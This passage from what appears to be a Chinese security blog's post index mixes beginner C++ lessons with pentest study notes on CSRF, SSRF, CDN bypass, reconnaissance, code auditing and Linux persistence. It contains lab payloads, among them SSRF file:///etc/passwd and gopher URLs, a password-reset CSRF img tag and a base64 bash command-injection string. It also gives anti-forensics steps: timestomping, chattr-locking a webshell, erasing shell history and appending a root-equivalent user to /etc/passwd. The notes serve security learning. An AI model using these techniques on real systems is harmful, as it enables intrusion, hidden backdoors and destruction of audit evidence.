，不过利用方式需要与xss的post利用方式类似 修改个人信息，抓包 生成csrf poc 模拟受害者点击 token Token：令牌，和Session，Cookie一样，都是身份标识，Token通常存在于URL和Cookie中，它是用于防止CSRF漏洞的。 漏洞检测 敏感功能缺乏csrf防护机制 在burpsuite中观察post请求是否带有随机Token 和 验证码 再判断 去掉/修改 Referer后是否仍然可以提交成功 网站可以允许写入csrf payload 测试用户头像&lt;img&gt; / 富文本区域的&lt;img&gt; &lt;svg&gt;标签(可控) 在头像处插入payload &lt;img src=&quot;http://www.xx.com/reset_pwd?new=123456&quot;&gt; 当其他人浏览时即触发csrf攻击 漏洞挖掘 常见思路 案例分析 蠕虫 账号停用 停用账号 抓包（没有token / 没有refer） 生成csrf poc 诱导其他用户点击 即停用账号 第三方账户绑定 绑定微博返回包 https://www.a.test.com/users/auth/weibo/callback?state={&quot;can_transfer&quot;%3A&quot;true&quot;}&amp;code=c593bc150745c37a4d5ec05332d406af 发给受害者 微博登录受害者账号 漏洞危害 具体功能决定危害程度 修改性别 / 个人信息等 修改管理员密码 添加管理员 后台getshell 漏洞防御 在铭感请求提交表单中加入随机的Token或者验证码，防止攻击者预测 合理校验请求Referer ，判断请求是否来自本站或者其他授权的域名；防御可写入csrf pyaload 攻击 ，禁止用户自定义任何标签的链接属性 靶场练习 <!-- more --> SSRF SSRF(Server-Side Request Forgery:服务器端请求伪造)，一般情况下ssrf攻击的目标时从外网无法访问的内部系统，简单来说就是让服务器替攻击者发请求 靶场练习 curl_exec 请求www.baidu.com判断有无ssrf漏洞 http://192.168.142.53/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com dict协议探测内网端口 http://192.168.142.53/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1 file协议读取内网文件 http://192.168.142.53/pikachu/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd gopher协议实现post请求 URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_(后接TCP数据流) 1、构造HTTP数据包 2、URL编码、替换回车换行为%0d%0a 3、发送gopher协议 1、问号（？）需要转码为URL编码，也就是%3f 2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a 3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束） 代码分析 危险函数 curl_exec curl_exec(CurlHandle $handle): string | bool 执行指定curl会话 这个函数应该在初始化curl会话并且设置所有选项后调用 file_get_content file_get_contents 将整个文件读入到一个字符串中 和file()一样，只除了file_get_contents()把文件读入到一个字符串中，将在参数offset指定的位置开始读取长度为length的内容。如果失败，file_get_contents()将返回false SSRF漏洞挖掘 常见思路 案例分析 网页翻译 在Google翻译中找到网页翻译，输入网址 奇奇怪怪的挖掘 正常访问 / 将/ 改为我们的主机地址 其他地址验证 工具 autorepeater 准备 autorepeater ceye.io ( dnslog / http 平台) 正则表达式 (?i)^(https|http|file)://.* 保证未编码的 URL 可以被正常匹配 (?i)^(https|http|file)%3A%2F%2F.* 保证编码的 URL 可以被正常匹配到 如下配置 然后配置如下规则: 正则的作用就是匹配 URL 然后替换成 DNSLOG 的地址,接着自动发包 然后在有空的时候去看看 DNSLOG 有没有数据或是把所有带 URL 的自己测试一遍就知道有没有 ssrf 测试 漏洞危害 扫描内部网络，获取网络结构以及内网机器指纹(FingerPrint) 向内部任意主机的任意端口发送精心构造的数据包(Payload) 通过请求大文件，保持keep-alive 发起拒绝服务攻击(DoS) 枚举爆破用户名，目录 文件等（Brute Force） 漏洞防御 1.尽量避免使用服务器根据用户参数远程加载资源 2. 尽量将资源固定化，避免用户提交可变参数 3. 对使用的开源库的ssrf漏洞进行了解 4. 鉴权 靶场练习（熟悉dict / file / gopher协议） vulhub靶场练习 https://vulhub.org/#/environments/weblogic/ssrf/ 感兴趣可以了解ssrf攻击 redis未授权服务 https://xz.aliyun.com/t/4051 攻击 kubernetes服务 https://cloud.tencent.com/developer/article/1893363 ","link":"https://xmoct.github.io/post/kua-zhan-jiao-ben-gong-ji/"},{"title":"C++编程2","content":"运算符 赋值运算符 作用：用于表达式的值赋给变量 赋值运算符包括以下几个符号： 示例： 比较运算符 作用：用于表达式的比较，并返回一个真值或假值 比较运算符有以下符号： 示例： 注意：C和C++ 语言的比较运算中， “真”用数字“1”来表示， “假”用数字“0”来表示。 逻辑运算符 作用：用于根据表达式的值返回真值或假值 逻辑运算符有以下符号： 示例1：逻辑非 总结： 真变假，假变真 示例2：逻辑与 总结：逻辑与运算符总结： 同真为真，其余为假 示例3：逻辑或 逻辑或运算符总结： 同假为假，其余为真 程序流程结构 C/C++支持最基本的三种程序运行结构：顺序结构、选择结构、循环结构 顺序结构：程序按顺序执行，不发生跳转 选择结构：依据条件是否满足，有选择的执行相应功能 循环结构：依据条件是否满足，循环多次执行某段代码 选择结构 if语句 作用：执行满足条件的语句 if语句的三种形式 单行格式if语句 多行格式if语句 多条件的if语句 单行格式if语句： if(条件){ 条件满足执行的语句 } 示例： 注意：if条件表达式后不要加分号 多行格式if语句： if(条件){ 条件满足执行的语句 }else{ 条件不满足执行的语句 }; 示例： 多条件的if语句： if(条件1){ 条件1满足执行的语句 }else if(条件2){条件2满足执行的语句}... else{ 都不满足执行的语句} 示例： 嵌套if语句：在if语句中，可以嵌套使用if语句，达到更精确的条件判断 案例需求： 提示用户输入一个高考考试分数，根据分数做如下判断 分数如果大于600分视为考上一本，大于500分考上二本，大于400考上三本，其余视为未考上本科； 在一本分数中，如果大于700分，考入北大，大于650分，考入清华，大于600考入人大。 示例： 练习案例： 三只小猪称体重 有三只小猪ABC，请分别输入三只小猪的体重，并且判断哪只小猪最重？ 三目运算符 作用： 通过三目运算符实现简单的判断 语法： 表达式1 ? 表达式2 ：表达式3 解释： 如果表达式1的值为真，执行表达式2，并返回表达式2的结果； 如果表达式1的值为假，执行表达式3，并返回表达式3的结果。 示例： 总结：和if语句比较，三目运算符优点是短小整洁，缺点是如果用嵌套，结构不清晰 3 switch语句 作用：执行多条件分支语句 语法： 示例： 注意1：switch语句中表达式类型只能是整型或者字符型 注意2：case里如果没有break，那么程序会一直向下执行 总结：与if语句比，对于多条件判断时，switch的结构清晰，执行效率高，缺点是switch不可以判断区间 ==== ","link":"https://xmoct.github.io/post/cbian-cheng-2/"},{"title":"C++编程1","content":"基础入门 第一个C++ 程序 编写一个C++程序总共分为4个步骤 创建项目 创建文件 编写代码 运行程序 创建项目 Visual Studio是我们用来编写C++程序的主要工具，我们先将它打开 创建空项目 创建文件 右键源文件，选择添加-&gt;新建项 给C++文件起个名称，然后点击添加即可。 编写代码 运行程序 注释 作用：在代码中加一些说明和解释，方便自己或其他程序员阅读 两种格式 单行注释：//描述信息 通常放在一行代码的上方，或者一条语句的末尾，只对本行起作用 多行注释：/描述信息/ 通常放在一段代码的上方，对包裹住的代码块起作用 提示：编译器在编译代码时，会忽略注释的内容。 变量 作用：给一段指定的内存空间起名，方便操作这段内存 语法：数据类型 变量名 = 初始值 注意：C++在创建变量时，必须给变量一个初始值，否则会报错 常量 作用：用于记录程序中不可更改的数据 定义常量的两种方式 #define 宏常量：#define 常量名 常量值 通常在文件上方定义，表示一个常量 const修饰的变量：const 数据类型 常量名 = 常量值 通常在变量定义前加关键字const，修饰该变量为常量，不可修改 关键字 作用：关键字是C++中预先保留的单词（标识符） 在定义变量或者常量时候，不要用关键字 C++关键字如下： | asm | do | if | return | typedef | | auto | double | inline | short | typeid | | bool | dynamic_cast | int signed | typename | | break | else | long | sizeof | union | | case | enum | mutable | static | unsigned | | catch | explicit | namespace | static_cast | using | | char | export | new | struct | virtual | | class | extern | operator | switch | void | |const | false | private | template | volatile | | const_cast | float | protected | this | wchar_t | | continue | for | public | throw | while | | default | friend | register | true | | delete | goto | reinterpret_cast | try | 提示：在给变量或者常量起名称时候，不要用C++得关键字，否则会产生歧义。 标识符命名规则 作用：C++规定给标识符（变量、常量）命名时，有一套自己的规则 标识符不能是关键字 标识符只能由字母、数字、下划线组成 第一个字符必须为字母或下划线 标识符中字母区分大小写 建议：给标识符命名时，争取做到见名知意的效果，方便自己和他人的阅读 数据类型 C++规定在创建一个变量或者常量时，必须要指定出相应的数据类型，否则无法给变量分配内存 整型 作用：整型变量表示的是整数类型的数据 C++中能够表示整型的类型有以下几种方式，区别在于所占内存空间不同： 数据类型 | 占用空间 | 取值范围 short(短整型) | 2字节 | (-215 ~ 215-1) int(整型) | 4字节 | (-231 ~ 231-1) long(长整形) | Windows为4字节，Linux为4字节(32位)，8字节(64位) | (-231 ~ 231-1) long long(长长整形) | 8字节 | (-263 ~ 263-1) sizeof关键字 作用：利用sizeof关键字可以统计数据类型所占内存大小 语法： sizeof( 数据类型 / 变量) 示例： 整型结论：short &lt; int &lt;= long &lt;= long long 实型（浮点型） 作用：用于表示小数 浮点型变量分为两种： 单精度float 双精度double 两者的区别在于表示的有效数字范围不同。 数据类型 占用空间 有效数字范围 float 4字节 7位有效数字 double 8字节 15～16位有效数字 示例： 字符型 作用：字符型变量用于显示单个字符 语法： char ch = 'a'; 注意1：在显示字符型变量时，用单引号将字符括起来，不要用双引号 注意2：单引号内只能有一个字符，不可以是字符串 C和C++中字符型变量只占用1个字节。 字符型变量并不是把字符本身放到内存中存储，而是将对应的ASCII编码放入到存储单元 示例： ASCII 码大致由以下两部分组成： ASCII 非打印控制字符： ASCII 表上的数字 0-31 分配给了控制字符，用于控制像打印机等一些外围设备。 ASCII 打印字符：数字 32-126 分配给了能在键盘上找到的字符，当查看或打印文档时就会出现。 转义字符 作用：用于表示一些不能显示出来的ASCII字符 现阶段常用的转义字符有：\\n \\\\ \\t 示例 字符串型 作用：用于表示一串字符 两种风格 c风格字符串：char 变量名[] = &quot;字符串值&quot; 注意：C风格的字符串要用双引号括起来 c++风格字符串：string 变量名 = &quot;字符串值&quot; 注意：C++风格字符串，需要加入头文件==#include== 布尔类型 作用：布尔数据类型代表真或假的值 bool类型只有两个值： true --- 真（本质是1） false --- 假（本质是0） 示例： 数据的输入 作用：用于从键盘获取数据 关键字：cin 语法： cin &gt;&gt; 变量 示例： 运算符 作用：用于执行代码的运算 本章我们主要讲解以下几类运算符： 算术运算符 作用：用于处理四则运算 算术运算符包括以下符号： 示例： 总结：在除法运算中，除数不能为0 示例： 总结：前置递增先对变量进行++，再计算表达式，后置递增相反 ","link":"https://xmoct.github.io/post/cbian-cheng/"},{"title":"CDN绕过","content":"CDN CDN检测 站长之家直接ping https://ping.chinaz.com/ 多地ping的结果不⼀致就是存在 nslookup 多地ping的结果不⼀致就是存在 CDN绕过 ⼦域名在线。 http://z.zcjun.com/ 通过⼦域名获取真实ip，⼦域名与主站点为同⼀个ip服务器，但是主域有cdn服务，2.c。 国外ping https://check-host.net/check-ping https://tcp.ping.pe/ DNS历史解析 https://viewdns.info/iphistory/?domain= 通过ico图标哈希 原理：图⽚有⼀串唯⼀的哈希，⽹络空间搜索引擎会收录全⽹ip信息进⾏排序收录，那么这些图标信息，也⾃然会 采集在测绘解析的⽬标中。 https://istudio.igskapp.com/favicon.ico 邮件 通过⽹站证书 将序列化:替换为空转化为10进制，然后cert=&quot;⼗进制&quot; https://tool.lu/hexconvert/ ssl证书 https://search.censys.io/certificates?q= app端、⼩程序 通过抓包⼯具来抓取APP的请求包，寻找真实IP。 ⽹站中的信息泄露 ⽐如js的内容，ajax的内容 验证IP真实 直接通过IP访问⽬标 直接访问有时候也不⾏，如果对⽅设置了禁⽌ip访问。 ","link":"https://xmoct.github.io/post/cdn-rao-guo/"},{"title":"权限维持","content":"#Linux权限维持 在红队行动中在网络中获得最初的立足点是一项耗时的任务。因此，持久性是红队成功运作的关键，这将使团队能够专注于目标，而不会失去与指挥和控制服务器的通信。 隐藏技巧 修改文件/终端属性 修改时间 如果蓝队根据文件修改时间来判断文件是否为后门，如参考index.php的时间再来看shell.php的时间就可以判断shell.php的生成时间有问题。 解决方法： touch -r index.php shell.php touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。 文件锁定 在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。 chattr +i evil.php #锁定文件 rm -rf evil.php #提示禁止删除 lsattr evil.php #属性查看(---i----) chattr -i evil.php #解除锁定 rm -rf evil.php #彻底删除文件 历史操作命令 在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？ 技巧一：只针对你的工作关闭历史记录 [space]set +o history #备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录 上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。 要重新开启历史功能，执行下面的命令 [Space]set -o history #将环境恢复原状 从历史记录中删除指定的命令 假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除 history | grep &quot;keyword&quot; 输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项： history -d [num] 删除大规模历史操作记录，这里，我们只保留前150行： sed -i '150,$d' .bash_history 添加用户 passwd写入 /etc/passwd 各部分含义： 用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL /etc/shadow 各部分含义： 用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用 增加超级用户（salt） 老系统 $echo &quot;momaek:savbSWc4rx8NY:hacker:/root:/bin/bash&quot; &gt;&gt; /etc/passwd 一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。 /etc/shadow 用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段 ","link":"https://xmoct.github.io/post/quan-xian-wei-chi/"},{"title":"代码审计","content":"代码审计 快速审计流程 找源码 Runtime与反射(代码审计\\命令执⾏bypass、webshell免杀、隐藏后门) JDBC反序列化(代码审计\\Fastjon其他利⽤链) ⽂件上传(代码审计、路径穿越) SQL注⼊(代码审计、⼩细节int和string) JNDI注⼊ (代码审计、fofa、实战利⽤、以及codebase) 反序列化漏洞演示（代码审计、yso、bp、环境） ⾼效获取源码的方式 cms | 普通web程序 = 批量⽣产 | 定制 fofa关键字搜索提取指纹特征 通过扫⽬录⼯具对所有站点进⾏⽬录扫描获取备份⽂件 title=&quot;管理系统&quot; title=&quot;dvAdmin管理系统&quot; Github或者Gitee搜索 源码网站获取 zuidaima.com bbs.52jscn.com down.chinaz.com 托源码（授权情况下） 获取目标权限下，拖源码 官网买（不建议） 同站点⽬录扫描(看备份⽂件.zip/.bak/.rar) fofa下载同cms的站点 dirsearch扫文件 咸鱼/淘宝/网盘买 快速审计 使用源码扫描工具 规则 DMSCA-企业级静态源代码扫描分析服务平台${.*} VeraCode静态源代码扫描分析服务平台 Fortify Scan 静态 ${},File file = new FIle(path),password 动态分析 jvm codeQl. JVM内存特征 log4j JNDI https://github.com/safe6Sec/CodeqlNote 手工代码审计 代码包的分类 inter ----&gt; Webservlet 1.按照web访问流程的架构 web 前端---&gt; Filter 权限校验（过滤层）(安全参数) ---&gt; Controller 参数过滤 sex 1,2 age 110（过滤业务（逻辑））---&gt;Service 8+10=18---&gt;Dao 持久化 insert ----&gt; 数据库 挖sql注入 一定要 在 Dao层（真正与数据库打交道），可能要绕Filter权限 短信轰炸（业务逻辑漏洞）要在 Service层（业务逻辑处理），可能要绕Controller 权限绕过 要在Filter层找 json（前后端分离）（响应包只有 数据 ）/ 表单（前后端不分离）（响应包有html代码） 前后端不分离：jquery、layui、bootstrap、 前后端分离：vue、angluar、react 2.按照功能模块划分 ⽤户管理 ,订单模块....... Controller\\Filter\\Service\\Dao User{Controller\\Filter\\Service\\Dao} setting{Controller\\Filter\\Service\\Dao} Maven源码审计(审第三方插件) maven新的模式，lib pom.xml pom评估或者lib⽬录评估 Maven项⽬对象模型(POM)，可以通过⼀⼩段描述信息来管理项⽬的构建，报告和⽂档的项⽬管理⼯具软件。 Maven 除了以程序构建能⼒为特⾊之外，还提供⾼级项⽬管理⼯具。由于 Maven 的缺省构建规则有较⾼的可重⽤性，所以常常⽤两三⾏ Maven 构建脚本就可以构建简单的项⽬。由于 Maven 的⾯向项⽬的⽅法，许多 Apache Jakarta 项⽬发⽂时使⽤ Maven，⽽且公司项⽬采⽤ Maven 的⽐例在持续增⻓。 Maven这个单词来⾃于意第绪语（犹太语），意为知识的积累，最初在Jakata Turbine项⽬中⽤来简化构建过程。 当时有⼀些项⽬（有各⾃Ant build⽂件），仅有细微的差别，⽽JAR⽂件都由CVS来维护。于是希望有⼀种标准化的⽅式构建项⽬，⼀个清晰的⽅式定义项⽬的组成，⼀个容易的⽅式发布项⽬的信息，以及⼀种简单的⽅式在多个 项⽬中共享JARs。 maven仓库讲解. https://search.maven.org maven三⽅依赖的危害性快速评估 各个依赖分别扮演⻆⾊ Runtime命令注入漏洞 Runtime是java执⾏系统命令的⼀个类 漏洞常见于路由器上 ping命令 Runtime的种类 原因是因为不同的重载⽅式在底层有不同处理，是否解析&amp;&amp;等命令。并⾮所有的runtime都可以进⾏注⼊，当然，在研究层⾯的意义上，有绕过的⼿法 寻找Runtime Ctrl + F 当前页面搜索 双击shift -- 全局搜索 查看Runtime中参数是数组还是字符串&amp;用户是否可控 字符串类型将执⾏的具有拼接字符的命令进⾏bash编码 whoami &amp;&amp; ifconfig String cmd = &quot;bash -c {echo,d2hvYW1pICYmIGlmY29uZmln} | {bash64,-d} | {bash,-i}&quot;; https://f5.pm/go-19610.html 反射和Runtime的结合 先使⽤反射加载 反射和Process的结合 命令拼接符 附录 Bookmarks 代码审计（java+php） <!-- more --> Xyntax/1000php: 1000个PHP代码审计案例(2016.7以前乌云公开漏洞) https://github.com/Xyntax/1000php cn-panda/JavaCodeAudit: Getting started with java code auditing 代码审计入门的小项目 https://github.com/cn-panda/JavaCodeAudit/ Pwnhub Web题Classroom题解与分析 | 离别歌 https://www.leavesongs.com/PENETRATION/pwnhub-web-classroom-django-sql-injection.html 帖子详情 - 『代码审计』知识星球 https://govuln.com/topic/407/ source insight https://govuln.com/topic/323/ phith0n/JavaThings: Share Things Related to Java - Java安全漫谈笔记相关内容 https://github.com/phith0n/JavaThings XCTF两道web题目的writeup | 离别歌 https://www.leavesongs.com/PENETRATION/Mini-XCTF-Writeup.html PHP代码审计学习 | 零の杂货铺 http://phantom0301.cc/2017/06/06/codeaudit/ PHP escapeshellarg()+escapeshellcmd() 之殇 https://paper.seebug.org/164/ 回忆phpcms头像上传漏洞以及后续影响 | 离别歌 https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html XDCTF2015代码审计全解 | 离别歌 https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html CHYbeta/Code-Audit-Challenges: Code-Audit-Challenges https://github.com/CHYbeta/Code-Audit-Challenges jiangsir404/Audit-Learning: 记录自己对《代码审计》的理解和总结，对危险函数的深入分析以及 在p牛的博客和代码审计圈的收获 https://github.com/jiangsir404/Audit-Learning java代码审计手书(一） - 先知社区 https://xz.aliyun.com/t/3358 Bug Patterns - Find Security Bugs https://find-sec-bugs.github.io/bugs.htm Go代码审计 - gitea 远程命令执行漏洞链 | 离别歌 https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html Java Web安全-代码审计（一） https://mp.weixin.qq.com/s/o1-G9LaK6OFUWbJs3cfKBg 帖子详情 - 『代码审计』知识星球 https://govuln.com/topic/1306/ From 0 to RCE: Cockpit CMS – PT SWARM https://swarm.ptsecurity.com/rce-cockpit-cms/ Trending Java repositories on GitHub this month https://github.com/trending/java?since=monthly&amp;spoken_language_code=zh burpheart/PHPAuditGuideBook: 《PHP代码审计入门指南》 这本指南包含了我在学习PHP代码审计过程中整理出的一些技巧和对漏洞的一些理解 https://github.com/burpheart/PHPAuditGuideBook java代码审计学习 - FreeBuf网络安全行业门户 https://www.freebuf.com/column/3143 ","link":"https://xmoct.github.io/post/dai-ma-shen-ji/"},{"title":"主动信息收集","content":"主动信息收集 基本结构 基本流程： 由攻击者主动发起请求或行为 目标收到请求或行为影响并给出反馈 攻击者获得反馈并判断特征 特点和应用场景 优点： 信息的针对性强 信息的准确度和时效性高 能收集到未公开的敏感信息 dirsearch、robots.txt、.rar 缺点： 容易暴露自身IP，被发现的风险高，【dirsea，waf，创宇盾】，同一个IP在固定时间段发送的危险请求数量&gt;某个值，被重定向或封禁。 收集的信息量和覆盖面比较少 ⼦域名信息收集 应⽤信息收集 端⼝信息收集 ⽬录收集 邮箱收集 股权架构收集 子域名信息收集 Oneforall https://github.com/shmilylty/OneForAll 服务器上跑 api配置 targets选项 ksubdomain https://github.com/boy-hack/ksubdomain ksubdomain tcp-全连接 半连接 无状态 多网卡分发式 Layer https://github.com/euphrat1ca/LayerDomainFinder teemo https://github.com/bit4woo/teemo subDomainsBrute https://github.com/lijiejie/subDomainsBrute 端口收集 masscan https://github.com/robertdavidgraham/masscan namp python对安全就不行 发包协议 nmap 指纹全面 但python慢 大工作不要用 goby https://gobysec.net/ goby就端口扫描，不要用poc 补充· 小米范 （扫内网好用） https://cloud.tencent.com/developer/article/1040188 基于ping命令探测 PING PING命令是我们常用的判断主机与主机之间网络连接是否畅通的方式之一，同样的也可以借此判断目标主机是否存活，不过现在很多设备开启了禁ping，所以需要去直接访问其相应的端口或域名去验活。 PING命令 ping 192.168.142.1 -c 1 PS G:&gt; ping 192.168.142.1 -c 1 正在 Ping 192.168.142.1 具有 32 字节的数据: 来自 192.168.142.1 的回复: 字节=32 时间&lt;1ms TTL=64 192.168.142.1 的 Ping 统计信息: 数据包: 已发送 = 1，已接收 = 1，丢失 = 0 (0% 丢失)，往返行程的估计时间(以毫秒为单位): 最短 = 0ms，最长 = 0ms，平均 = 0ms 想要获取到当前主机到目标主机之间经过的设备，可以使用traceroute命令进行探测 Traceroute命令 traceroute www.baidu.com 然而PING命令也延申出来很多其他的命令，如ARPING、FPING、HPING等 ARPING ARPING 1、arp协议概述 ARP协议是“Address Resolution Protocol”（地址解析协议）的缩写，计算机通过ARP协议将IP地址转换成MAC地址 2、ARP协议工作原理 在以太网中，数据传输的目标 地址是MAC地址，一个主机要和另一个主机进行直接通信，必需要知道主机的MAC地址。 计算机使用者通常只知道目标机器的IP信息，“地址解析”就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。 话句话说，ARP协议负责将局域网中的32位IP地址转换为对应的48位物理地址，即网卡MAC地址，使通信连接正常进行。 ARP工作原理 A主机：我想知道192.168.142.1的物理地址-&gt; B交换机：我知道了，我查查我的地址表，欸不好意思没找到，我去问问别人 B交换机：查看地址表中存活的主机，开始像其他主机发出询问（根据交换机的ARP缓存表-&gt;MAC地址表询问），N段时间后…… C主机：收到来自其他主机询问请求，查看后发现竟是自己，给询问主机发出确认响应给出物理地址 B交换机：我找到了192.168.142.1的物理地址，将MAC发送给了A主机 A主机：收到了交换机的回复，给交换机回复收到的响应报 -&gt;B交换机：确认A主机收到消息。监听…… windows查看MAC地址 ipconfig /all 使用arping命令查看IP是否冲突 arping 192.168.142.1 使用Ctrl+C结束Arping命令 查看arp缓存表 arp -a 使用netdiscover进行被动方式探测局域网中存活主机 netdiscover是一个主动/被动的ARP侦查工具，使用netdiscover工具可以在网络中扫描IP地址，检查在线主机活搜索为它们发送的ARP请求 主动模式 主动模式就是主动的探测发现网络内主机，但是这种方式容易被查看到 netdiscover -i eth0 -r 192.168.142.0/24 被动模式 被动模式的方式更为隐蔽，但是速度会叫慢，网卡被设置为为混杂模式来侦听网络中的arp数据包进行被动式探测，这种方式久就需要网络内设备发送arp包才能被探测到 netdiscover -p ","link":"https://xmoct.github.io/post/zhu-dong-xin-xi-shou-ji/"},{"title":"被动信息收集","content":"基本的测试流程介绍 == 准备相应的⼯具和材料 cs 免杀⻢ frp nps proxifi. 服务器。 goby xray。 one for all Behinder 加密算法。 nginx ，域前置。上线提醒 做第⼀次信息收集 //快速打点 shuize，Eeyes，Ehole 做漏洞扫描或攻击⾯测试 针对突出的攻击⾯做具体的渗透。 //详细的信息收集 进⼊环境之后的第⼆次信息收集 提升权限 维持权限 寻找扩⼤攻击⾯的渠道 清理攻击痕迹 编写报告 信息收集在整个流程中的定位 渗透的本质是信息收集，攻防的体系是知识点的串联。 内⽹ ｜ 外⽹ 资产 每⼀步的攻击流程⽬的都是⾮常重要的。 如果最终达到的⽬的不需要某⼏步流程，那么就完全不⽤去做。 信息收集在整个渗透测试流程中是⾮常重要的步骤，是决定攻击是否成功的决定点。 信息收集决定之后的攻击⾯或漏洞扫描的范围，也决定整个攻击过程中对⾃⼰和⽬标的定位。 信息收集的基本要求： 全⾯： 做到对⽬标所有的业务⾯和⾮业务⾯的存在点进⾏全⾯的信息收集。 准确： 注意 对于收集到的信息尤其是重要信息要再三确认其信息的准确性，对信息的内容中所涉及的技术点要⼿动查看。 时效： 对于收集到的信息要注意信息产⽣的时间和收集到的时间，是否具有时间差，时间差能否接受，如果存在失效 的信息要及时清除。 隐匿： 降低被发现度，提⾼隐蔽性。 细⼼，耐⼼，这两点⾮常⾮常重要。 分类： 主动信息收集 被动信息收集 被动信息收集 公开渠道可获得的信息 与目标系统不产生直接交互 尽量避免留下一切痕迹 OSINT 信息收集内容 ip地址段 域名信息 邮件地址 文档图片数据 公司地址 公司组织架构 联系电话/传真号码 人员姓名/职务 目标系统使用的技术架构 公开的商业信息 信息用途 用信息描述目标 发现系统 社会工程学攻击 物理缺口 被动信息收集的特点和应⽤场景 被动信息收集的优缺点： 优点： 隐蔽性⾼，不容易被发现 收集的信息量和覆盖⾯⽐较⼤ 缺点： 收集到的信息中时效性和准确性不⾼ ⽆法收集到敏感或者未公开的信息 被动信息收集在实战中⾮常常⽤，尤其是在⽹络安全的攻防对抗中，我们通常⻅到的各种渗透流程也会经常使⽤被动信息收集，⽐如通过被动信息收集获得⽬标的基本要素，然后根据信息要素判断⽬标特点并分析弱点，最后根据弱点针对性地做下⼀步的攻击活动。 信息收集的介绍 渗透测试，是渗透测试⼯程师完全模拟⿊客可能使⽤的攻击技术和漏洞发现技术，对⽬标⽹络、主机、应⽤的安全作深⼊的探测，帮助企业挖掘出正常业务流程中的安全缺陷和漏洞，助⼒企业先于⿊客发现安全⻛险，防患于未然。进⾏web渗透测试之前，最重要的⼀步那就是就是信息收集了，俗话说“渗透的本质也就是信息收集”，信息收集的深度，直接关系到渗透测试的成败。打好信息收集这⼀基础可以让测试者选择合适和准确的渗透测试攻击⽅式，缩短渗透测试的时间，⼀般来说收集的信息越多越好，通常包括以下⼏个部分： checklist 域名信息收集 ⼦域名信息收集 站点信息收集 敏感信息收集 应⽤信息收集 端⼝信息收集 真实IP地址识别 cdn 域名信息收集 渗透过程当中，信息收集需要⼀个⼊⼿点，以此为点再由点到⾯。 通过百度直接搜索⽬标关键字 通过fofa中title关键字 通过企查查 微信公众号 app商城 ⼩程序 ⼦域名信息收集 fofa https://scan.javasec.cn (虽然是爆破,但是是第三⽅) site:beijing.gov.cn 通过⾕歌语法 两者的区别:host更推荐使⽤,路径包含 4. Eeyes 棱眼（c段） 5. quake 360 6. 鹰图 fofa_viewer Kunyu InfoSearchAll ⼩蓝本 零零信安 站点信息 (通常⽤做资产证明) http://whois.chinaz.com/ Whois站⻓之家查询 https://whois.aliyun.com/ 阿⾥云中国万⽹查询 http://whois.domaintools.com/ Whois Lookup 查找⽬标⽹站所有者 https://whois.aizhan.com/ 站⻓⼯具爱站查询 爱企查 企查查 敏感信息收集 robots.txt google语法 结合使⽤例⼦：wordpress下的alfa插件的敏感信息泄露查询 应⽤信息收集 CMS（内容管理系统）⼜称为整站系统或⽂章系统，⽤于⽹站内容管理。⽤户只需要下载对应的CMS软件包，就能部署搭建，并直接利⽤CMS。但是各种CMS都具有其独特的结构命名规则和特定的⽂件内容，因此可以利⽤这些内容来获取CMS站点的具体软件CMS与版本。在渗透测试中，对进⾏指纹识别是相当有必要的，识别出相应的CMS，才能查找与其相关的漏洞，然后才能进⾏相应的渗透操作。常⻅的CMS有泛微、通达、⽤友、致远等重点 wappalyzer https://github.com/fofapro/fofa_view/releases/tag/v0.0.5 在线指纹 BugScaner: http://whatweb.bugscaner.com/look/ 潮汐指纹： http://finger.tidesec.net/ 云悉： http://www.yunsee.cn/info.html 4.棱洞 端⼝信息收集 fofa 鹰图 CDN CDN检测 站⻓之家直接ping https://ping.chinaz.com/ 多地ping的结果不⼀致就是存在 nslookup nslookup的地址为多个就是存在 CDN绕过 ⼦域名在线。 http://z.zcjun.com/ 通过⼦域名获取真实ip，⼦域名与主站点为同⼀个ip服务器，但是主域有cdn服务，2.c。 国外ping https://check-host.net/check-ping https://tcp.ping.pe/ DNS历史解析 https://viewdns.info/iphistory/?domain= 通过ico图标哈希 原理：图⽚有⼀串唯⼀的哈希，⽹络空间搜索引擎会收录全⽹ip信息进⾏排序收录，那么这些图标信息，也⾃然会 采集在测绘解析的⽬标中。 https://istudio.igskapp.com/favicon.ico 邮件 通过⽹站证书 将序列化:替换为空转化为10进制，然后cert=&quot;⼗进制&quot; https://tool.lu/hexconvert/ ssl证书 https://search.censys.io/certificates?q= app端、⼩程序 通过抓包⼯具来抓取APP的请求包，寻找真实IP。 ⽹站中的信息泄露 ⽐如js的内容，ajax的内容 验证IP真实 直接通过IP访问⽬标 